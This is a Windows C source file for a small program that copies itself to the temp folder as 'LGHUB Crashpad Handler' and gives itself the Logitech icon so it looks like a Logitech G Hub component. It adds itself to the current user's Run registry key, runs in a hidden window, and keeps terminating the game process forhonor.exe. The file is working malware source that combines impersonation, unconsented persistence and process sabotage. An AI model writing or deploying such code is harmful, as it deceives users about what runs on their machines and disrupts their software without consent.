#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include "resource.h"
#include "logitech_icon.h"

#define FILE_MAX_PATH 1024

#define WINDOW_NAME "LGHUB Crashpad Handler"
#define EXE_NAME "LGHUB Crashpad Handler"

#define TARGET_NAME_PROCESS "forhonor.exe"

void StartExeProcess(char *exe_path)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcess(NULL,
                      exe_path,
                      NULL,
                      NULL,
                      FALSE,
                      0,
                      NULL,
                      NULL,
                      &si,
                      &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void UpdateIcon(const char *target_exe) {
    HANDLE hUpdate = BeginUpdateResource(target_exe, FALSE);
    if (hUpdate == NULL) {
        return;
    }

    if (!UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), __src_logitech_ico, __src_logitech_ico_len)) {
        EndUpdateResource(hUpdate, TRUE);
        return;
    }

    HRSRC hIcon;
    HGLOBAL hIconData;
    LPVOID pIconData;
    DWORD iconSize;
    for (int i = 0; i < 3; i++) {
        hIcon = FindResource(NULL, MAKEINTRESOURCE(101 + i), RT_ICON);
        if (hIcon != NULL) {
            hIconData = LoadResource(NULL, hIcon);
            if (hIconData != NULL) {
                pIconData = LockResource(hIconData);
                iconSize = SizeofResource(NULL, hIcon);
                if (!UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(1 + i), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pIconData, iconSize)) {
                }
            }
        }
    }

    if (!EndUpdateResource(hUpdate, FALSE)) {
        return;
    }
}

void AddToStartup(const char *app_name, const char *path_to_exe)
{
    HKEY hKey;
    LONG result;

    result = RegOpenKeyEx(HKEY_CURRENT_USER,
                          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_SET_VALUE,
                          &hKey);

    if (result != ERROR_SUCCESS)
    {
        return;
    }

    result = RegSetValueEx(hKey, app_name, 0, REG_SZ, (const BYTE *)path_to_exe, strlen(path_to_exe) + 1);

    if (result != ERROR_SUCCESS)
    {
        return;
    }

    RegCloseKey(hKey);
}

void FindAndCloseProcessByName(char *name)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, name) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

                TerminateProcess(hProcess, 69);

                CloseHandle(hProcess);
            }
        }
    }

    CloseHandle(snapshot);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CLOSE:
        DestroyWindow(hwnd);
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        ExitProcess(0);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return 0;
}

HWND CreateWinApp(int sWidth, int sHeight)
{
    WNDCLASS wc = {};
    wc.style = 0;
    wc.lpszClassName = WINDOW_NAME;
    wc.lpszMenuName = WINDOW_NAME;
    wc.hInstance = GetModuleHandle(0);
    wc.hbrBackground = 0;
    wc.lpfnWndProc = WindowProc;
    wc.hIcon = LoadIcon(GetModuleHandle(0), MAKEINTRESOURCE(IDI_APP_ICON));

    if (!RegisterClass(&wc))
    {
        return 0;
    }

    HWND hwnd = CreateWindow(
        WINDOW_NAME,
        WINDOW_NAME,
        0,
        CW_USEDEFAULT, CW_USEDEFAULT, // x, y
        sWidth, sHeight,              // width, height
        NULL,
        NULL,
        GetModuleHandle(0),
        NULL);

    ShowWindow(hwnd, SW_HIDE);
    UpdateWindow(hwnd);

    return hwnd;
}

void CleanUpWinApp(HWND hwnd)
{
    DestroyWindow(hwnd);
    UnregisterClass(WINDOW_NAME, GetModuleHandle(0));
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    char temp_path[FILE_MAX_PATH];
    char self_path[FILE_MAX_PATH];
    char dest_path[FILE_MAX_PATH];

    if (GetTempPath(FILE_MAX_PATH, temp_path) == 0)
    {
        exit(EXIT_FAILURE);
    }

    snprintf(dest_path, sizeof(dest_path), "%s" EXE_NAME ".exe", temp_path);

    if (GetModuleFileName(NULL, self_path, FILE_MAX_PATH) != 0)
    {
        CopyFile(self_path, dest_path, 0);
    }

    UpdateIcon(dest_path);
    AddToStartup(WINDOW_NAME, dest_path);
    if (strcmp(self_path, dest_path) != 0)
    {
        StartExeProcess(dest_path);
        exit(0);
    }

    HWND hwnd = CreateWinApp(0, 0);
    if (hwnd == 0)
    {
        return 1;
    }

    int running = 1;

    int bRet;
    MSG msg = {};

    while ((bRet = GetMessage(&msg, hwnd, 0, 0)) != 0)
    {
        if (bRet == -1)
        {
            break;
        }
        else if (bRet != 0)
        {
            FindAndCloseProcessByName(TARGET_NAME_PROCESS);
            Sleep(1000);

            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        else
        {
            break;
        }
    }

    CleanUpWinApp(hwnd);

    return 0;
}
